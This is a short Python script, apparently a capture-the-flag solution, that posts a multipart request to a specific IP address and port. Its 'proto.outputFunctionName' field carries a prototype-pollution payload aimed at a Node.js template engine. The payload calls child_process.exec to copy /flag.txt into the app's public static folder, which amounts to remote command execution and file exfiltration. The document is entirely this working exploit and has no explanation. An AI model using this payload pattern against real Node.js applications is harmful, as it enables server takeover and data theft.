import requests

req = requests.post('http://61.147.171.105:60548/4_pATh_y0u_CaNN07_Gu3ss', files = {'proto.outputFunctionName': (None, "x;console.log(1);process.mainModule.require('child_process').exec('cp /flag.txt /app/static/js/flag.txt');x")})